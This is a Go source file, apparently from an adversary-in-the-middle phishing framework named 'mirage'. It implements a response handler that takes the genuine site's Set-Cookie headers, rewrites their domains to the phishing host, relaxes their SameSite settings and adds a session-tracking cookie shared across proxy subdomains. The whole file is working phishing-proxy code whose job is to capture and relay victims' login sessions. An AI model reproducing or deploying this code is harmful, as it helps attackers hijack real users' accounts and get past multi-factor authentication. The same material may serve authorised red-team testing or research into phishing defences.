package response

import (
	"net/http"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// CookieRewriter rewrites upstream Set-Cookie domains to the phishing domain
// and injects the session tracking cookie on the first response.
type CookieRewriter struct{}

func (h *CookieRewriter) Name() string { return "CookieRewriter" }

func (h *CookieRewriter) Handle(ctx *aitm.ProxyContext, resp *http.Response) error {
	cookies := resp.Cookies()
	resp.Header.Del("Set-Cookie")

	for _, cookie := range cookies {
		if ctx.Phishlet != nil && cookie.Domain != "" {
			cookie.Domain = rewriteCookieDomain(cookie.Domain, ctx.Phishlet)
		}
		cookie.Secure = true
		cookie.SameSite = http.SameSiteNoneMode
		resp.Header.Add("Set-Cookie", cookie.String())
	}

	if ctx.IsNewSession && ctx.Session != nil && ctx.Phishlet != nil {
		tracker := &http.Cookie{
			Name:     proxy.SessionCookieName,
			Value:    ctx.Session.ID,
			Path:     "/",
			HttpOnly: true,
			Secure:   true,
			SameSite: http.SameSiteNoneMode,
		}
		// For multi-host phishlets, scope the tracking cookie to the base domain
		// so it's shared across all proxy host subdomains.
		if len(ctx.Phishlet.ProxyHosts) > 1 {
			tracker.Domain = ctx.Phishlet.BaseDomain
		}
		resp.Header.Add("Set-Cookie", tracker.String())
	}
	return nil
}

func rewriteCookieDomain(upstreamDomain string, p *aitm.Phishlet) string {
	cleanDomain := strings.TrimPrefix(strings.ToLower(upstreamDomain), ".")
	for _, proxyHost := range p.ProxyHosts {
		if strings.HasSuffix(cleanDomain, strings.ToLower(proxyHost.Domain)) {
			return proxyHost.PhishHost(p.BaseDomain)
		}
	}
	return upstreamDomain
}

var _ proxy.ResponseHandler = (*CookieRewriter)(nil)
